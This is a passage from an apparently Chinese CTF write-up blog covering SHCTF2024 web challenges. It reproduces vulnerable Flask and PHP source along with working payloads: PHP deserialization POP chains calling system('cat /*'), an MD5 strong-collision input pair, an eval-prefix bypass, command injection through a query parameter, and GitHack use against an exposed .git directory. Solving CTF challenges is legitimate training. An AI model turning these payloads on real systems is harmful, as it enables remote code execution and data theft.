class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;R:<span class="number">9</span>;&#125;i:<span class="number">1</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>最后面就直接去读flag即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%<span class="number">9</span>fab&amp;ez[ser.from_you=a:<span class="number">2</span>:&#123;i:<span class="number">1</span>;O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;f&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;e&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;R&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;r&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;system(&quot;</span>cat <span class="comment">/*&quot;);&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;N;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF2024</title>
    <url>/2024/11/04/SHCTF2024/</url>
    <content><![CDATA[<h3 id="Week1-1zflask"><a href="#Week1-1zflask" class="headerlink" title="[Week1] 1zflask"></a>[Week1] 1zflask</h3><p>题目提示robots,直接访问robots.txt即可获得/s3recttt，下载app.py源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;SSHCTFF&#x27;</span>, <span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_from_root</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder,<span class="string">&#x27;robots.txt&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s3recttt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>直接访问/api即可进行rce</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/api?<span class="variable constant_">SSHCTFF</span>=cat <span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<h3 id="Week1-MD5-Master"><a href="#Week1-MD5-Master" class="headerlink" title="[Week1] MD5 Master"></a>[Week1] MD5 Master</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>md5强碰撞绕过即可，这里需要碰撞前的字符串为MD5 master!，这样就可以达到绕过，通过bp提交即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">master1=%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%3D%<span class="variable constant_">DD</span>%<span class="variable constant_">F6FS</span>%<span class="number">00</span>%0B%<span class="variable constant_">AE</span>%3E%<span class="number">21</span>%0Es%<span class="variable constant_">E2</span>%89r%<span class="variable constant_">EA</span>%8D%3A%<span class="variable constant_">F2</span>%<span class="number">21</span>%1C%<span class="variable constant_">E9</span>%<span class="number">22</span>%1CD%<span class="variable constant_">D2</span>%7E%<span class="variable constant_">FAL</span>%<span class="number">10</span>%<span class="variable constant_">A2</span>%1D%9D%<span class="variable constant_">F1</span>%<span class="variable constant_">F2</span>%F6l%<span class="variable constant_">AB</span>%<span class="number">85</span>%<span class="number">18</span>%<span class="variable constant_">EF</span>%<span class="variable constant_">C1A</span>%1B%<span class="variable constant_">C8WL</span>%<span class="number">88</span>%<span class="variable constant_">AC</span>%7D%<span class="variable constant_">FC</span>%<span class="variable constant_">E7</span>%<span class="variable constant_">C1</span>%7D%3DG%<span class="variable constant_">BDD</span>%0BEsbAQtY%8DP%<span class="number">23</span>%<span class="variable constant_">FE</span>%<span class="variable constant_">F8</span>%<span class="variable constant_">F2</span>%8D%<span class="number">14</span>%<span class="variable constant_">F2S</span>%<span class="variable constant_">A8</span>%<span class="variable constant_">BE</span>%<span class="variable constant_">E7</span>%<span class="number">96</span>%<span class="number">00</span>%10x%<span class="number">97</span>%<span class="variable constant_">C8</span>%<span class="variable constant_">E3L</span>%<span class="variable constant_">DD</span>%1C%25l%<span class="variable constant_">E7Q</span>%<span class="variable constant_">C7</span>%7C%<span class="variable constant_">DE</span>%<span class="number">21</span>%<span class="number">88</span>%<span class="variable constant_">F2</span>%<span class="number">19</span>%<span class="variable constant_">BC</span>%<span class="number">91</span>%<span class="number">10</span>%<span class="number">87</span>%9A%<span class="number">15</span>%<span class="variable constant_">C5Y</span>%9D%<span class="number">88</span>%<span class="variable constant_">F6</span>%<span class="variable constant_">DD</span>%<span class="variable constant_">C9</span>%3C%0D%<span class="variable constant_">DD</span>%<span class="number">89</span>%<span class="variable constant_">D6</span>%<span class="variable constant_">F3</span>%<span class="number">15</span>%<span class="variable constant_">B0</span>%<span class="variable constant_">ED</span>%<span class="variable constant_">CEY</span>%D3tck&amp;master2=%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%3D%<span class="variable constant_">DD</span>%<span class="variable constant_">F6FS</span>%<span class="number">00</span>%0B%<span class="variable constant_">AE</span>%3E%<span class="number">21</span>%0Es%<span class="variable constant_">E2</span>%89r%<span class="variable constant_">EA</span>%8D%3A%<span class="variable constant_">F2</span>%<span class="variable constant_">A1</span>%1C%<span class="variable constant_">E9</span>%<span class="number">22</span>%1CD%<span class="variable constant_">D2</span>%7E%<span class="variable constant_">FAL</span>%<span class="number">10</span>%<span class="variable constant_">A2</span>%1D%9D%<span class="variable constant_">F1</span>%<span class="variable constant_">F2</span>%F6l%<span class="variable constant_">AB</span>%<span class="number">85</span>%<span class="number">18</span>%<span class="variable constant_">EF</span>%<span class="variable constant_">C1A</span>%1B%<span class="variable constant_">C8</span>%<span class="variable constant_">D7L</span>%<span class="number">88</span>%<span class="variable constant_">AC</span>%7D%<span class="variable constant_">FC</span>%<span class="variable constant_">E7</span>%<span class="variable constant_">C1</span>%7D%3DG%<span class="variable constant_">BDD</span>%0B%C5sbAQtY%8DP%<span class="number">23</span>%<span class="variable constant_">FE</span>%<span class="variable constant_">F8</span>%<span class="variable constant_">F2</span>%8D%<span class="number">14</span>%<span class="variable constant_">F2S</span>%<span class="variable constant_">A8</span>%<span class="variable constant_">BE</span>%<span class="variable constant_">E7</span>%<span class="number">96</span>%<span class="number">00</span>%10x%<span class="number">17</span>%<span class="variable constant_">C8</span>%<span class="variable constant_">E3L</span>%<span class="variable constant_">DD</span>%1C%25l%<span class="variable constant_">E7Q</span>%<span class="variable constant_">C7</span>%7C%<span class="variable constant_">DE</span>%<span class="number">21</span>%<span class="number">88</span>%<span class="variable constant_">F2</span>%<span class="number">19</span>%<span class="variable constant_">BC</span>%<span class="number">91</span>%<span class="number">10</span>%<span class="number">87</span>%9A%<span class="number">15</span>%<span class="variable constant_">C5Y</span>%9D%<span class="number">08</span>%<span class="variable constant_">F6</span>%<span class="variable constant_">DD</span>%<span class="variable constant_">C9</span>%3C%0D%<span class="variable constant_">DD</span>%<span class="number">89</span>%<span class="variable constant_">D6</span>%<span class="variable constant_">F3</span>%<span class="number">15</span>%<span class="variable constant_">B0</span>%<span class="variable constant_">ED</span>%<span class="variable constant_">CE</span>%<span class="variable constant_">D9</span>%D3tck</span><br></pre></td></tr></table></figure>
<h3 id="Week1-ez-gittt"><a href="#Week1-ez-gittt" class="headerlink" title="[Week1] ez_gittt"></a>[Week1] ez_gittt</h3><p>git泄露，直接通过GitHack来查看即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python2 <span class="title class_">GitHack</span>.<span class="property">py</span> <span class="attr">http</span>:<span class="comment">//210.44.150.15:47817/.git/</span></span><br><span class="line">git show</span><br></pre></td></tr></table></figure>
<h3 id="Week1-jvav"><a href="#Week1-jvav" class="headerlink" title="[Week1] jvav"></a>[Week1] jvav</h3><p>这个题要通过java来执行系统命令来获取flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">main</span>(String[] args) &#123;</span><br><span class="line">        <span class="comment">// 创建ProcessBuilder对象，传入&quot;ls&quot;命令</span></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 启动进程</span></span><br><span class="line">            Process process = processBuilder.<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用BufferedReader读取进程的输出流</span></span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.<span class="title function_ invoke__">getInputStream</span>()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.<span class="title function_ invoke__">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 打印输出结果</span></span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(line);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待进程结束，并获取退出值</span></span><br><span class="line">            <span class="keyword">int</span> exitCode = process.<span class="title function_ invoke__">waitFor</span>();</span><br><span class="line">            <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Command executed successfully.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Command execution failed with exit code: &quot;</span> + exitCode);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="title function_ invoke__">printStackTrace</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">// 重新设置中断标志</span></span><br><span class="line">            Thread.<span class="title function_ invoke__">currentThread</span>().<span class="title function_ invoke__">interrupt</span>();</span><br><span class="line">            e.<span class="title function_ invoke__">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Week1-poppopop"><a href="#Week1-poppopop" class="headerlink" title="[Week1] poppopop"></a>[Week1] poppopop</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SH</span> &#123; </span><br><span class="line">    public <span class="keyword">static</span> $Web = <span class="literal">false</span>; </span><br><span class="line">    public <span class="keyword">static</span> $SHCTF = <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123; </span><br><span class="line">    public $p; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">flag</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        ($this-&gt;p)(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">T</span>&#123; </span><br><span class="line">    public $n; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">SH</span>::$Web = <span class="literal">true</span>; </span><br><span class="line">        echo $this-&gt;n; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span> &#123; </span><br><span class="line">    public $o; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__toString</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">SH</span>::$SHCTF = <span class="literal">true</span>; </span><br><span class="line">        $this-&gt;o-&gt;<span class="title function_">flag</span>(); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;其实。。。。,&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHCTF</span> &#123; </span><br><span class="line">    public $isyou; </span><br><span class="line">    public $flag; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__invoke</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="attr">SH</span>::$Web) &#123; </span><br><span class="line"></span><br><span class="line">            ($this-&gt;isyou)($this-&gt;flag); </span><br><span class="line">            echo <span class="string">&quot;小丑竟是我自己呜呜呜~&quot;</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            echo <span class="string">&quot;小丑别看了!&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">isset</span>($_GET[<span class="string">&#x27;data&#x27;</span>])) &#123; </span><br><span class="line">    <span class="title function_">highlight_file</span>(__FILE__); </span><br><span class="line">    <span class="title function_">unserialize</span>(<span class="title function_">base64_decode</span>($_GET[<span class="string">&#x27;data&#x27;</span>])); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_">highlight_file</span>(__FILE__); </span><br><span class="line">    echo <span class="string">&quot;小丑离我远点！！！&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是一个序列化题，没有什么好讲的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SH</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> $Web = <span class="literal">false</span>;</span><br><span class="line">    public <span class="keyword">static</span> $SHCTF = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">T</span>&#123;</span><br><span class="line">    public $n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span> &#123;</span><br><span class="line">    public $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHCTF</span> &#123;</span><br><span class="line">    public $isyou=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    public $flag=<span class="string">&quot;cat /*&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title function_">T</span>();</span><br><span class="line">$a-&gt;n=<span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line">$a-&gt;n-&gt;o=<span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line">$a-&gt;n-&gt;o-&gt;p=<span class="keyword">new</span> <span class="title function_">SHCTF</span>();</span><br><span class="line">echo <span class="title function_">base64_encode</span>(<span class="title function_">serialize</span>($a));</span><br><span class="line"><span class="title class_">TzoxOiJUIjoxOntzOjE6Im4</span>iO086MToiRiI6MTp7czoxOiJvIjtPOjE6IkMiOjE6e3M6MToicCI7Tzo1OiJTSENURiI6Mjp7czo1OiJpc3lvdSI7czo2OiJzeXN0ZW0iO3M6NDoiZmxhZyI7czo2OiJjYXQgLyoiO319fX0=</span><br></pre></td></tr></table></figure>
<h3 id="Week1-单身十八年的手速"><a href="#Week1-单身十八年的手速" class="headerlink" title="[Week1] 单身十八年的手速"></a>[Week1] 单身十八年的手速</h3><p>查看game.js直接寻找最后的base编码得flag</p>
<h3 id="Week1-蛐蛐-蛐蛐"><a href="#Week1-蛐蛐-蛐蛐" class="headerlink" title="[Week1] 蛐蛐?蛐蛐!"></a>[Week1] 蛐蛐?蛐蛐!</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;ququ&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_">strrev</span>($_GET[<span class="string">&#x27;ququ&#x27;</span>]) != <span class="number">415411</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;ququ&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        $eval_param = $_POST[<span class="string">&#x27;ququ&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">strncmp</span>($eval_param,<span class="string">&#x27;ququk1&#x27;</span>,<span class="number">6</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">eval</span>($_POST[<span class="string">&#x27;ququ&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">echo</span>(<span class="string">&quot;可以让fault的蛐蛐变成现实么\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">echo</span>(<span class="string">&quot;蛐蛐成功第一步！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">echo</span>(<span class="string">&quot;呜呜呜fault还是要出题&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里直接通过提交ququ=114514a即可绕过第一个if,后面的if需要ququk1开头，但是直接拼接命令再后面即可,报错但是会执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ququ=ququk1;<span class="title function_">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Week2-MD5-GOD"><a href="#Week2-MD5-GOD" class="headerlink" title="[Week2]MD5 GOD!"></a>[Week2]MD5 GOD!</h3><p>下载源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, os, random</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">config</span>[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;Th1s_is_5ecr3t_k3y&quot;</span></span><br><span class="line">salt = os.<span class="title function_">urandom</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">md5</span>(data):</span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_">md5</span>(data).<span class="title function_">hexdigest</span>().<span class="title function_">encode</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">    <span class="keyword">if</span> sign == <span class="title function_">md5</span>(salt + msg + username):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">getRandom</span>(str_length=<span class="number">16</span>):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    生成一个指定长度的随机字符串</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    random_str =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str =<span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length =<span class="title function_">len</span>(base_str) -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(str_length):</span><br><span class="line">        random_str +=base_str[random.<span class="title function_">randint</span>(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line">sign_users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.<span class="title function_">get</span>(<span class="string">&#x27;sign&#x27;</span>) == <span class="title class_">None</span> or session.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>) == <span class="title class_">None</span> or session.<span class="title function_">get</span>(<span class="string">&#x27;msg&#x27;</span>) == <span class="title class_">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    sign = session.<span class="title function_">get</span>(<span class="string">&#x27;sign&#x27;</span>)</span><br><span class="line">    username = session.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    msg = session.<span class="title function_">get</span>(<span class="string">&#x27;msg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">        sign_users[username.<span class="title function_">decode</span>()] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;签到成功&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        # <span class="title function_">print</span>(password)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users and users[username] == <span class="attr">password</span>:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username.<span class="title function_">encode</span>()</span><br><span class="line">            session[<span class="string">&quot;msg&quot;</span>] = <span class="title function_">md5</span>(salt + password.<span class="title function_">encode</span>())</span><br><span class="line">            session[<span class="string">&quot;sign&quot;</span>] = <span class="title function_">md5</span>(salt + <span class="title function_">md5</span>(salt + password.<span class="title function_">encode</span>()) + username.<span class="title function_">encode</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登陆成功&quot;</span></span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登陆失败&quot;</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/users&quot;</span>)</span><br><span class="line">def <span class="title function_">user</span>():</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">dumps</span>(sign_users)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">def <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> <span class="attr">users</span>:</span><br><span class="line">        <span class="keyword">if</span> sign_users[user] != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;flag&#123;杂鱼~&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">open</span>(<span 